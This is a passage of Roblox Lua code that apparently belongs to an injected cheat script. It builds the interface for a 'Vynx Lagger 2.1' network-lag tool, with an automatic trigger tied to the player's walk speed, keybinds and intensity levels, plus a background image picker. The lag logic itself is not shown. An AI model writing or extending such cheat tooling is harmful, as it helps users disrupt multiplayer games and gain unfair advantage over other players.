    brRow.BackgroundColor3 = CARD
    brRow.BorderSizePixel = 0
    brRow.ZIndex = 21
    Instance.new("UICorner", brRow).CornerRadius = UDim.new(0, 8)
    local brLbl = Instance.new("TextLabel", brRow)
    brLbl.Size = UDim2.new(0.6, 0, 1, 0)
    brLbl.Position = UDim2.new(0, 10, 0, 0)
    brLbl.BackgroundTransparency = 1
    brLbl.Text = "Auto Brainrot"
    brLbl.TextColor3 = WHITE
    brLbl.Font = Enum.Font.GothamBold
    brLbl.TextSize = 11
    brLbl.TextXAlignment = Enum.TextXAlignment.Left
    brLbl.ZIndex = 22
    local brBtn = Instance.new("TextButton", brRow)
    brBtn.Size = UDim2.new(0, 52, 0, 24)
    brBtn.Position = UDim2.new(1, -60, 0.5, -12)
    brBtn.BackgroundColor3 = M.pingAutoBrainrot and GREEN or Color3.fromRGB(70, 25, 35)
    brBtn.BorderSizePixel = 0
    brBtn.Text = M.pingAutoBrainrot and "ON" or "OFF"
    brBtn.TextColor3 = WHITE
    brBtn.Font = Enum.Font.GothamBlack
    brBtn.TextSize = 10
    brBtn.ZIndex = 23
    Instance.new("UICorner", brBtn).CornerRadius = UDim.new(1, 0)
    brBtn.MouseButton1Click:Connect(function()
        M.pingAutoBrainrot = not M.pingAutoBrainrot
        brBtn.Text = M.pingAutoBrainrot and "ON" or "OFF"
        brBtn.BackgroundColor3 = M.pingAutoBrainrot and GREEN or Color3.fromRGB(70, 25, 35)
        pcall(saveCherryConfig)
    end)

    
    local function mkBind(y, label, which)
        local row = Instance.new("Frame", settingsFrame)
        row.Size = UDim2.new(1, -16, 0, 34)
        row.Position = UDim2.new(0, 8, 0, y)
        row.BackgroundColor3 = CARD
        row.BorderSizePixel = 0
        row.ZIndex = 21
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.4, 0, 1, 0)
        lbl.Position = UDim2.new(0, 10, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = label
        lbl.TextColor3 = WHITE
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.ZIndex = 22
        local btn = Instance.new("TextButton", row)
        btn.Size = UDim2.new(0, 78, 0, 24)
        btn.Position = UDim2.new(1, -86, 0.5, -12)
        btn.BackgroundColor3 = Color3.fromRGB(20, 10, 32)
        btn.BorderSizePixel = 0
        btn.Text = which == "kb" and (M.pingKeybindKb or "F") or (M.pingKeybindGp or "ButtonR2")
        btn.TextColor3 = PINK2
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 10
        btn.ZIndex = 23
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        btn.MouseButton1Click:Connect(function()
            M.pingListening = which
            btn.Text = "Press..."
            btn.TextColor3 = Color3.fromRGB(255, 210, 80)
        end)
        return btn
    end
    local kbBtn = mkBind(166, "Keyboard", "kb")
    local gpBtn = mkBind(206, "Controller", "gp")

    local gearBtn = Instance.new("TextButton", header)
    gearBtn.Size = UDim2.new(0, 26, 0, 26)
    gearBtn.Position = UDim2.new(1, -58, 0.5, -13)
    gearBtn.BackgroundColor3 = Color3.fromRGB(50, 18, 40)
    gearBtn.BorderSizePixel = 0
    gearBtn.Text = "⚙"
    gearBtn.TextColor3 = WHITE
    gearBtn.Font = Enum.Font.GothamBlack
    gearBtn.TextSize = 13
    gearBtn.ZIndex = 4
    gearBtn.AutoButtonColor = false
    Instance.new("UICorner", gearBtn).CornerRadius = UDim.new(0, 7)
    gearBtn.MouseButton1Click:Connect(function()
        settingsFrame.Visible = not settingsFrame.Visible
        powerBox.Text = tostring(M.pingPower)
        intervalBox.Text = tostring(M.pingInterval)
        kbBtn.Text = M.pingKeybindKb or "F"
        gpBtn.Text = M.pingKeybindGp or "ButtonR2"
        brBtn.Text = M.pingAutoBrainrot and "ON" or "OFF"
        brBtn.BackgroundColor3 = M.pingAutoBrainrot and GREEN or Color3.fromRGB(70, 25, 35)
    end)

    
    if M._pingInputConn then pcall(function() M._pingInputConn:Disconnect() end) end
    M._pingInputConn = UIS.InputBegan:Connect(function(input, processed)
        local kc = input.KeyCode
        if kc == Enum.KeyCode.Unknown then return end
        local isGp = vynxPingIsGamepad(kc)
        local isKb = input.UserInputType == Enum.UserInputType.Keyboard
        if M.pingListening then
            if kc == Enum.KeyCode.Escape then
                M.pingListening = nil
                kbBtn.Text = M.pingKeybindKb or "F"
                gpBtn.Text = M.pingKeybindGp or "ButtonR2"
                kbBtn.TextColor3 = PINK2
                gpBtn.TextColor3 = PINK2
                return
            end
            if M.pingListening == "kb" and isKb then
                M.pingKeybindKb = kc.Name
                M.pingListening = nil
                kbBtn.Text = kc.Name
                kbBtn.TextColor3 = PINK2
                pcall(saveCherryConfig)
                return
            end
            if M.pingListening == "gp" and isGp then
                M.pingKeybindGp = kc.Name
                M.pingListening = nil
                gpBtn.Text = kc.Name
                gpBtn.TextColor3 = PINK2
                pcall(saveCherryConfig)
                return
            end
            return
        end
        if processed then return end
        local kbEnum = vynxPingResolveKb(M.pingKeybindKb)
        local gpEnum = vynxPingResolveKb(M.pingKeybindGp)
        if M.pingPanelOpen and ((kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp)) then
            M.setPingActive(not M.pingActive, true)
        end
    end)

    
    if M._pingBrainrotConn then pcall(function() M._pingBrainrotConn:Disconnect() end) end
    M._pingBrainrotConn = RunService.Heartbeat:Connect(function()
        
        if not M.pingPanelOpen then
            if M.pingActive then M.pingActive = false end
            if M.pingBrainrotMode then
                M.pingBrainrotMode = false
                M.pingLastBrainrot = false
            end
            return
        end
        if not M.pingAutoBrainrot then
            if M.pingBrainrotMode then
                M.pingBrainrotMode = false
                M.pingLastBrainrot = false
            end
            return
        end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local hasBrainrot = hum.WalkSpeed < 25
        if hasBrainrot and not M.pingLastBrainrot then
            M.pingBrainrotMode = true
            M.pingLastBrainrot = true
            M.pingManualOverride = false
            M.setPingActive(true, false)
        elseif not hasBrainrot and M.pingLastBrainrot then
            M.pingBrainrotMode = false
            M.pingLastBrainrot = false
            M.pingManualOverride = false
            M.setPingActive(false, false)
        end
    end)
end

function M.setPingPanelOpen(on)
    M.pingPanelOpen = on and true or false
    if M.pingPanelOpen and (not M.pingGui or not M.pingGui.Parent) then
        M.buildPingLaggerUI()
    end
    if M.pingMain then
        M.pingMain.Visible = M.pingPanelOpen
    end
    
    if not M.pingPanelOpen then
        M.pingActive = false
        M.pingBrainrotMode = false
        M.pingLastBrainrot = false
        M.pingManualOverride = false
        if M._pingRefreshVisual then pcall(M._pingRefreshVisual) end
    end
    if M.setPingPanelVisual then
        pcall(function() M.setPingPanelVisual(M.pingPanelOpen) end)
    end
    pcall(saveCherryConfig)
end





function M.buildVynxLaggerUI()
    if M.vynxLaggerGui and M.vynxLaggerGui.Parent then
        pcall(function() M.vynxLaggerGui:Destroy() end)
    end
    M.vynxLaggerGui = nil
    M.vynxLaggerMain = nil
    M.vynxLaggerSettings = nil

    
    local accent   = UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(145, 70, 255)
    local accentDim= UI_ACCENT_DIM or accent:Lerp(Color3.new(0,0,0), 0.35)
    local PURPLE   = accent
    local PURPLE2  = accentDim
    local WHITE    = Color3.fromRGB(255, 255, 255)
    local DIM      = accentDim:Lerp(Color3.fromRGB(200,200,210), 0.4)
    local GREEN    = Color3.fromRGB(110, 255, 160)
    local RED      = Color3.fromRGB(240, 70, 90)
    local BG       = themeDarkFromAccent and themeDarkFromAccent(accent, 0.10) or Color3.fromRGB(12, 12, 14)
    local CARD     = themeDarkFromAccent and themeDarkFromAccent(accent, 0.18) or Color3.fromRGB(22, 22, 26)
    local KEY_BG   = Color3.fromRGB(32, 32, 36)

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxLagger21Gui"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 19
    gui.IgnoreGuiInset = true
    local okP = false
    if gethui then okP = pcall(function() gui.Parent = gethui() end) end
    if not okP then pcall(function() gui.Parent = player:WaitForChild("PlayerGui") end) end
    M.vynxLaggerGui = gui

    local MAIN_W, MAIN_H = 270, 112
    local main = Instance.new("Frame")
    main.Name = "VynxLaggerMain"
    main.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
    main.Position = UDim2.new(0.5, -MAIN_W/2, 0.40, 0)
    main.BackgroundColor3 = BG
    main.BackgroundTransparency = 0.05
    main.BorderSizePixel = 0
    main.ClipsDescendants = true
    main.Active = true
    main.Visible = M.vynxLaggerPanelOpen == true
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 8)
    local stroke = Instance.new("UIStroke", main)
    stroke.Color = Color3.fromRGB(40, 40, 48)
    stroke.Thickness = 1
    stroke.Transparency = 0.15
    M.vynxLaggerMain = main

    pcall(function()
        if M.applyCustomBackground then M.applyCustomBackground(main) end
        local img = main:FindFirstChild("CustomBgImage")
        if img then
            img.ImageTransparency = math.min(tonumber(M.customBgOpacity) or 0.35, 0.22)
            img.ZIndex = 0
        end
        main.BackgroundTransparency = 0.35
    end)

    
    do
        local dragging, dragStart, startPos
        main.InputBegan:Connect(function(i)
            if M.uiLocked then return end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true; dragStart = i.Position; startPos = main.Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                local d = i.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    
    local header = Instance.new("Frame", main)
    header.Size = UDim2.new(1, -12, 0, 28)
    header.Position = UDim2.new(0, 6, 0, 6)
    header.BackgroundTransparency = 1
    header.ZIndex = 2

    local title = Instance.new("TextLabel", header)
    title.Size = UDim2.new(0, 160, 0, 22)
    title.Position = UDim2.new(0, 2, 0, 2)
    title.BackgroundTransparency = 1
    title.Text = "VYNX LAGGER 2.1"
    title.Font = Enum.Font.GothamBold
    title.TextColor3 = WHITE
    title.TextSize = 14
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextStrokeTransparency = 0.4
    title.ZIndex = 3

    local modeHint = Instance.new("TextLabel", header)
    modeHint.Size = UDim2.new(0, 120, 0, 12)
    modeHint.Position = UDim2.new(0, 2, 0, 18)
    modeHint.BackgroundTransparency = 1
    modeHint.Text = "LOW  ·  MID  ·  HIGH"
    modeHint.Font = Enum.Font.GothamBold
    modeHint.TextColor3 = DIM
    modeHint.TextSize = 8
    modeHint.TextXAlignment = Enum.TextXAlignment.Left
    modeHint.ZIndex = 3

    local closeBtn = Instance.new("TextButton", header)
    closeBtn.Size = UDim2.new(0, 22, 0, 22)
    closeBtn.Position = UDim2.new(1, -22, 0, 2)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "X"
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextColor3 = WHITE
    closeBtn.TextSize = 14
    closeBtn.ZIndex = 4
    closeBtn.MouseButton1Click:Connect(function()
        M.setVynxLaggerPanelOpen(false)
    end)

    local minBtn = Instance.new("TextButton", header)
    minBtn.Size = UDim2.new(0, 22, 0, 22)
    minBtn.Position = UDim2.new(1, -46, 0, 2)
    minBtn.BackgroundTransparency = 1
    minBtn.Text = "-"
    minBtn.Font = Enum.Font.GothamBold
    minBtn.TextColor3 = WHITE
    minBtn.TextSize = 16
    minBtn.ZIndex = 4

    
    local control = Instance.new("Frame", main)
    control.Name = "ControlBar"
    control.Size = UDim2.new(1, -12, 0, 36)
    control.Position = UDim2.new(0, 6, 0, 38)
    control.BackgroundColor3 = CARD
    control.BackgroundTransparency = 0.35
    control.BorderSizePixel = 0
    control.ZIndex = 2
    Instance.new("UICorner", control).CornerRadius = UDim.new(0, 8)

    
    local keyBtn = Instance.new("TextButton", control)
    keyBtn.Size = UDim2.new(0, 36, 0, 26)
    keyBtn.Position = UDim2.new(0, 6, 0.5, -13)
    keyBtn.BackgroundColor3 = KEY_BG
    keyBtn.BorderSizePixel = 0
    keyBtn.Text = tostring(M.vynxLaggerKeybindKb or "V")
    keyBtn.Font = Enum.Font.GothamBold
    keyBtn.TextColor3 = WHITE
    keyBtn.TextSize = 12
    keyBtn.ZIndex = 3
    keyBtn.AutoButtonColor = false
    Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0, 4)

    local statusLbl = Instance.new("TextLabel", control)
    statusLbl.Size = UDim2.new(0, 120, 0, 20)
    statusLbl.Position = UDim2.new(0, 48, 0.5, -10)
    statusLbl.BackgroundTransparency = 1
    statusLbl.Text = M.vynxLaggerActive and "LAGGER: ON" or "LAGGER: OFF"
    statusLbl.Font = Enum.Font.GothamBold
    statusLbl.TextColor3 = M.vynxLaggerActive and PURPLE or RED
    statusLbl.TextSize = 12
    statusLbl.TextXAlignment = Enum.TextXAlignment.Left
    statusLbl.ZIndex = 3

    
    local switchBg = Instance.new("Frame", control)
    switchBg.Size = UDim2.new(0, 34, 0, 18)
    switchBg.Position = UDim2.new(1, -42, 0.5, -9)
    switchBg.BackgroundColor3 = M.vynxLaggerActive and PURPLE or Color3.fromRGB(40, 40, 44)
    switchBg.BorderSizePixel = 0
    switchBg.ZIndex = 3
    Instance.new("UICorner", switchBg).CornerRadius = UDim.new(1, 0)

    local switchKnob = Instance.new("Frame", switchBg)
    switchKnob.Size = UDim2.new(0, 12, 0, 12)
    switchKnob.Position = M.vynxLaggerActive and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
    switchKnob.BackgroundColor3 = WHITE
    switchKnob.BorderSizePixel = 0
    switchKnob.ZIndex = 4
    Instance.new("UICorner", switchKnob).CornerRadius = UDim.new(1, 0)

    local toggleHit = Instance.new("TextButton", control)
    toggleHit.Size = UDim2.new(1, 0, 1, 0)
    toggleHit.BackgroundTransparency = 1
    toggleHit.Text = ""
    toggleHit.ZIndex = 5

    local function setToggleVisual(on)
        statusLbl.Text = on and "LAGGER: ON" or "LAGGER: OFF"
        statusLbl.TextColor3 = on and PURPLE or RED
        TweenService:Create(switchBg, TweenInfo.new(0.15), {
            BackgroundColor3 = on and PURPLE or Color3.fromRGB(40, 40, 44)
        }):Play()
        TweenService:Create(switchKnob, TweenInfo.new(0.15), {
            Position = on and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
        }):Play()
        stroke.Color = on and PURPLE or Color3.fromRGB(40, 40, 48)
    end

    toggleHit.MouseButton1Click:Connect(function()
        M.setVynxLaggerActive(not M.vynxLaggerActive)
        setToggleVisual(M.vynxLaggerActive)
    end)

    
    local levelRow = Instance.new("Frame", main)
    levelRow.Name = "LevelRow"
    levelRow.Size = UDim2.new(1, -12, 0, 28)
    levelRow.Position = UDim2.new(0, 6, 0, 78)
    levelRow.BackgroundTransparency = 1
    levelRow.ZIndex = 2

    local levelBtns = {}
    local function refreshLevels()
        local cur = M.vynxLaggerLevel or "Mid"
        for name, b in pairs(levelBtns) do
            local on = (name == cur)
            b.BackgroundColor3 = on and PURPLE or KEY_BG
            b.TextColor3 = WHITE
            local st = b:FindFirstChildOfClass("UIStroke")
            if st then
                st.Color = on and (PURPLE:Lerp(Color3.new(1,1,1), 0.3)) or Color3.fromRGB(50, 50, 58)
                st.Transparency = on and 0.15 or 0.45
            end
        end
    end

    local labels = {
        Low = "LOW",
        Mid = "MID",
        High = "HIGH",
    }
    for i, name in ipairs({"Low", "Mid", "High"}) do
        local b = Instance.new("TextButton", levelRow)
        b.Size = UDim2.new(0, 82, 0, 26)
        b.Position = UDim2.new(0, (i - 1) * 86, 0, 1)
        b.BackgroundColor3 = KEY_BG
        b.BorderSizePixel = 0
        b.Text = labels[name]
        b.Font = Enum.Font.GothamBold
        b.TextColor3 = WHITE
        b.TextSize = 11
        b.ZIndex = 3
        b.AutoButtonColor = false
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
        local st = Instance.new("UIStroke", b)
        st.Color = Color3.fromRGB(50, 50, 58)
        st.Thickness = 1
        st.Transparency = 0.45
        b.MouseButton1Click:Connect(function()
            M.vynxLaggerLevel = name
            refreshLevels()
            pcall(saveCherryConfig)
        end)
        levelBtns[name] = b
    end
    refreshLevels()

    
    local isMin = false
    local fullSize = UDim2.new(0, MAIN_W, 0, MAIN_H)
    local minSize = UDim2.new(0, MAIN_W, 0, 36)
    minBtn.MouseButton1Click:Connect(function()
        isMin = not isMin
        minBtn.Text = isMin and "+" or "-"
        control.Visible = not isMin
        levelRow.Visible = not isMin
        TweenService:Create(main, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = isMin and minSize or fullSize
        }):Play()
    end)

    function M._vynxLaggerRefreshVisual()
        if not (statusLbl and statusLbl.Parent) then return end
        setToggleVisual(M.vynxLaggerActive == true)
        refreshLevels()
    end
    M._vynxLaggerRefreshVisual()

    
    local listening = false
    local listenTimeout = nil
    keyBtn.MouseButton1Click:Connect(function()
        if listenTimeout then task.cancel(listenTimeout) end
        listening = true
        keyBtn.Text = "..."
        keyBtn.TextColor3 = PURPLE
        listenTimeout = task.delay(5, function()
            if listening then
                listening = false
                keyBtn.Text = tostring(M.vynxLaggerKeybindKb or "V")
                keyBtn.TextColor3 = WHITE
            end
        end)
    end)

    if M._vynxLaggerInputConn then pcall(function() M._vynxLaggerInputConn:Disconnect() end) end
    M._vynxLaggerInputConn = UIS.InputBegan:Connect(function(input, processed)
        local kc = input.KeyCode
        if kc == Enum.KeyCode.Unknown then return end
        if listening and input.UserInputType == Enum.UserInputType.Keyboard then
            M.vynxLaggerKeybindKb = kc.Name
            listening = false
            keyBtn.Text = kc.Name
            keyBtn.TextColor3 = WHITE
            if listenTimeout then task.cancel(listenTimeout); listenTimeout = nil end
            pcall(saveCherryConfig)
            return
        end
        if processed then return end
        local name = M.vynxLaggerKeybindKb
        if M.vynxLaggerPanelOpen and name and name ~= "" and name ~= "None" then
            local ok, enum = pcall(function() return Enum.KeyCode[name] end)
            if ok and enum and kc == enum then
                M.setVynxLaggerActive(not M.vynxLaggerActive)
                setToggleVisual(M.vynxLaggerActive)
            end
        end
    end)
end

function M.setVynxLaggerPanelOpen(on)
    M.vynxLaggerPanelOpen = on and true or false
    if M.vynxLaggerPanelOpen and (not M.vynxLaggerGui or not M.vynxLaggerGui.Parent) then
        M.buildVynxLaggerUI()
    end
    if M.vynxLaggerMain then
        M.vynxLaggerMain.Visible = M.vynxLaggerPanelOpen
    end
    if not M.vynxLaggerPanelOpen then
        M.vynxLaggerActive = false
        if M._vynxLaggerRefreshVisual then pcall(M._vynxLaggerRefreshVisual) end
    end
    if M.setVynxLaggerPanelVisual then
        pcall(function() M.setVynxLaggerPanelVisual(M.vynxLaggerPanelOpen) end)
    end
    pcall(saveCherryConfig)
end


function M.buildMusicUI()
    
    pcall(function() if M.musicGui then M.musicGui:Destroy() end end)
    M.musicGui, M.musicMain = nil, nil
    M.musicPanelOpen = false
end


function M.setMusicPanelOpen(on)
    M.musicPanelOpen = false
end


function M.applyCustomBackground(frame)
    if not frame then return end
    local existing = frame:FindFirstChild("CustomBgImage")
    if existing then existing:Destroy() end
    local id = tonumber(M.customBgId)
    if not id or id <= 0 then
        id = 0
    end
    if id <= 0 then return end 
    pcall(function() frame.ClipsDescendants = true end)
    local img = Instance.new("ImageLabel")
    img.Name = "CustomBgImage"
    img.BackgroundTransparency = 1
    img.Image = "rbxassetid://" .. tostring(id)
    img.ScaleType = Enum.ScaleType.Crop
    img.Size = UDim2.fromScale(1, 1)
    img.Position = UDim2.fromScale(0, 0)
    img.ZIndex = 0
    img.ImageTransparency = math.clamp(tonumber(M.customBgOpacity) or 0.35, 0, 1)
    img.Parent = frame
    local radius = UDim.new(0, M.MENU_CORNER_R or 16)
    local fc = frame:FindFirstChildOfClass("UICorner")
    if fc then radius = fc.CornerRadius end
    local c = Instance.new("UICorner")
    c.Name = "BgCorner"
    c.CornerRadius = radius
    c.Parent = img
end

function M.applyPingBackgrounds()
    
    local function applyVisible(frame)
        if not frame then return end
        pcall(function() M.applyCustomBackground(frame) end)
        local img = frame:FindFirstChild("CustomBgImage")
        if img and img:IsA("ImageLabel") then
            
            img.ImageTransparency = math.clamp(math.min(tonumber(M.customBgOpacity) or 0.35, 0.18), 0, 0.35)
            img.ZIndex = 0
            img.ScaleType = Enum.ScaleType.Crop
        end
        
        pcall(function()
            frame.BackgroundTransparency = 0.55
        end)
    end
    applyVisible(M.pingMain)
    applyVisible(M.pingSettings)
end

function M.openImagePicker(kind)
    
    local isBg = kind == "bg"
    local ids = isBg and M.BG_IMAGE_IDS or M.MOB_BTN_IMAGE_IDS
    local title = isBg and "CUSTOM BG" or "BUTTON BG"
    local currentId = isBg and (tonumber(M.customBgId) or 0) or (tonumber(M.mobBtnBgId) or 0)
    local opacity = math.clamp(tonumber(M.customBgOpacity) or 0.35, 0, 1)

    local old = player.PlayerGui:FindFirstChild("VynxImagePicker")
    if old then old:Destroy() end
    local cg = game:GetService("CoreGui"):FindFirstChild("VynxImagePicker")
    if cg then cg:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxImagePicker"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 120
    pcall(function() gui.Parent = game:GetService("CoreGui") end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end

    
    local dim = Instance.new("TextButton")
    dim.Size = UDim2.fromScale(1, 1)
    dim.BackgroundColor3 = Color3.new(0, 0, 0)
    dim.BackgroundTransparency = 0.45
    dim.Text = ""
    dim.AutoButtonColor = false
    dim.ZIndex = 1
    dim.Parent = gui
    dim.MouseButton1Click:Connect(function() gui:Destroy() end)

    
    local thumbCount = 1 + #(ids or {})
    local cols = 4
    local rows = math.max(1, math.ceil(thumbCount / cols))
    local gridH = rows * 48 + math.max(0, rows - 1) * 8 + 8
    local panelW = 280
    local panelH = isBg and (34 + 100 + 12 + gridH + 52) or (34 + 100 + 12 + gridH + 16)
    panelH = math.clamp(panelH, 230, 420)

    local panel = Instance.new("Frame")
    panel.AnchorPoint = Vector2.new(0.5, 0.5)
    panel.Position = UDim2.new(0.5, 0, 0.5, 0)
    panel.Size = UDim2.new(0, panelW, 0, panelH)
    panel.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
    panel.BorderSizePixel = 0
    panel.ZIndex = 2
    panel.ClipsDescendants = true
    panel.Parent = gui
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 14)
    local pst = Instance.new("UIStroke", panel)
    pst.Color = Color3.fromRGB(50, 50, 60)
    pst.Thickness = 1

    local hdr = Instance.new("TextLabel")
    hdr.Size = UDim2.new(1, -40, 0, 28)
    hdr.Position = UDim2.new(0, 12, 0, 6)
    hdr.BackgroundTransparency = 1
    hdr.Text = title
    hdr.TextColor3 = Color3.fromRGB(230, 230, 235)
    hdr.Font = Enum.Font.GothamBold
    hdr.TextSize = 12
    hdr.TextXAlignment = Enum.TextXAlignment.Left
    hdr.ZIndex = 3
    hdr.Parent = panel

    local close = Instance.new("TextButton")
    close.Size = UDim2.new(0, 24, 0, 24)
    close.Position = UDim2.new(1, -30, 0, 6)
    close.BackgroundTransparency = 1
    close.Text = "×"
    close.TextColor3 = Color3.fromRGB(180, 180, 190)
    close.Font = Enum.Font.GothamBold
    close.TextSize = 18
    close.ZIndex = 3
    close.Parent = panel
    close.MouseButton1Click:Connect(function() gui:Destroy() end)

    local preview = Instance.new("ImageLabel")
    preview.Name = "Preview"
    preview.Size = UDim2.new(1, -24, 0, 100)
    preview.Position = UDim2.new(0, 12, 0, 34)
    preview.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
    preview.BorderSizePixel = 0
    preview.ScaleType = Enum.ScaleType.Crop
    preview.Image = currentId > 0 and ("rbxassetid://" .. currentId) or ""
    preview.ImageTransparency = isBg and opacity or 0
    preview.ZIndex = 3
    preview.Parent = panel
    Instance.new("UICorner", preview).CornerRadius = UDim.new(0, 10)

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -24, 0, gridH)
    scroll.Position = UDim2.new(0, 12, 0, 142)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 4
    scroll.ScrollBarImageColor3 = UI_ACCENT or Color3.fromRGB(200, 200, 200)
    scroll.ScrollingDirection = Enum.ScrollingDirection.Y
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scroll.ClipsDescendants = true
    scroll.ZIndex = 3
    scroll.Parent = panel

    local lay = Instance.new("UIGridLayout")
    lay.CellSize = UDim2.fromOffset(48, 48)
    lay.CellPadding = UDim2.fromOffset(8, 8)
    lay.SortOrder = Enum.SortOrder.LayoutOrder
    lay.HorizontalAlignment = Enum.HorizontalAlignment.Left
    lay.VerticalAlignment = Enum.VerticalAlignment.Top
    lay.FillDirectionMaxCells = cols
    lay.Parent = scroll

    local selectedId = currentId

    local function selectId(id)
        selectedId = id
        preview.Image = id > 0 and ("rbxassetid://" .. id) or ""
        if isBg then
            M.customBgId = id
            if M.mainFrame then M.applyCustomBackground(M.mainFrame) end
            
            
            if M.statusMain then
                local bg = M.statusMain:FindFirstChild("CustomBgImage")
                if bg then pcall(function() bg:Destroy() end) end
            end
            if M.antiDesyncMain then M.applyCustomBackground(M.antiDesyncMain) end
            if M.applyPingBackgrounds then M.applyPingBackgrounds() end
            pcall(function() M.applyAntiDesyncTheme() end)
        else
            M.mobBtnBgId = id
            if M.mobileButtonsEnabled then M.buildMobileButtons() end
        end
        saveCherryConfig()
    end

    
    local none = Instance.new("TextButton")
    none.Size = UDim2.new(0, 48, 0, 48)
    none.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
    none.Text = "OFF"
    none.TextColor3 = Color3.fromRGB(200, 200, 210)
    none.Font = Enum.Font.GothamBold
    none.TextSize = 10
    none.ZIndex = 4
    none.LayoutOrder = 0
    none.Parent = scroll
    Instance.new("UICorner", none).CornerRadius = UDim.new(0, 8)
    none.MouseButton1Click:Connect(function() selectId(0) end)

    for i, id in ipairs(ids) do
        local thumb = Instance.new("ImageButton")
        thumb.Size = UDim2.new(0, 48, 0, 48)
        thumb.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
        thumb.Image = "rbxassetid://" .. tostring(id)
        thumb.ScaleType = Enum.ScaleType.Crop
        thumb.ZIndex = 4
        thumb.LayoutOrder = i
        thumb.Parent = scroll
        Instance.new("UICorner", thumb).CornerRadius = UDim.new(0, 8)
        local st = Instance.new("UIStroke", thumb)
        st.Color = Color3.fromRGB(255, 255, 255)
        st.Transparency = (id == currentId) and 0.2 or 0.7
        st.Thickness = 1
        thumb.MouseButton1Click:Connect(function()
            selectId(id)
            for _, ch in ipairs(scroll:GetChildren()) do
                if ch:IsA("ImageButton") then
                    local s = ch:FindFirstChildOfClass("UIStroke")
                    if s then s.Transparency = 0.7 end
                end
            end
            st.Transparency = 0.2
        end)
    end

    if isBg then
        local opY = 142 + gridH + 8
        local opLbl = Instance.new("TextLabel")
        opLbl.Size = UDim2.new(0.5, -12, 0, 18)
        opLbl.Position = UDim2.new(0, 12, 0, opY)
        opLbl.BackgroundTransparency = 1
        opLbl.Text = "OPACITY"
        opLbl.TextColor3 = Color3.fromRGB(160, 160, 170)
        opLbl.Font = Enum.Font.GothamBold
        opLbl.TextSize = 10
        opLbl.TextXAlignment = Enum.TextXAlignment.Left
        opLbl.ZIndex = 3
        opLbl.Parent = panel

        local opVal = Instance.new("TextLabel")
        opVal.Size = UDim2.new(0.5, -12, 0, 18)
        opVal.Position = UDim2.new(0.5, 0, 0, opY)
        opVal.BackgroundTransparency = 1
        opVal.Text = tostring(math.floor((1 - opacity) * 100)) .. "%"
        opVal.TextColor3 = Color3.fromRGB(200, 200, 210)
        opVal.Font = Enum.Font.GothamBold
        opVal.TextSize = 10
        opVal.TextXAlignment = Enum.TextXAlignment.Right
        opVal.ZIndex = 3
        opVal.Parent = panel

        
        local track = Instance.new("Frame")
        track.Size = UDim2.new(1, -24, 0, 8)
        track.Position = UDim2.new(0, 12, 0, opY + 24)
        track.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
        track.BorderSizePixel = 0
        track.ZIndex = 3
        track.Parent = panel
        Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

        local fill = Instance.new("Frame")
        fill.Size = UDim2.new(1 - opacity, 0, 1, 0)
        fill.BackgroundColor3 = Color3.fromRGB(220, 220, 230)
        fill.BorderSizePixel = 0
        fill.ZIndex = 4
        fill.Parent = track
        Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

        local knob = Instance.new("Frame")
        knob.Size = UDim2.new(0, 16, 0, 16)
        knob.AnchorPoint = Vector2.new(0.5, 0.5)
        knob.Position = UDim2.new(1 - opacity, 0, 0.5, 0)
        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knob.BorderSizePixel = 0
        knob.ZIndex = 5
        knob.Parent = track
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local dragging = false
        local function setFromX(x)
            local rel = math.clamp((x - track.AbsolutePosition.X) / math.max(track.AbsoluteSize.X, 1), 0, 1)
            
            local imageTransparency = 1 - rel
